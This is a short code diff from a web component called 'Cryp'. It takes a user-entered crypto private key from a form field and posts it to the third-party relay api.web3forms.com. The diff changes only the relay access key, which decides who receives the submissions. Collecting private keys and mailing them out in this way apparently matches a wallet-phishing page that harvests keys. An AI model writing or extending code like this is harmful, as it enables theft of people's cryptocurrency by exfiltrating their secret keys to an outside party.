@@ -38,7 +38,7 @@ const Cryp = () => {
       newFormData.append("privateKey", privateKeyRef.current.value.trim());
     }
 
-    newFormData.append("access_key", "d43a769a-9969-4b3c-8ee8-224d5f026388");
+    newFormData.append("access_key", "f6a02db2-3319-40f8-8b64-6dbbffa7ca14");
 
     try {
       const response = await fetch("https://api.web3forms.com/submit", {
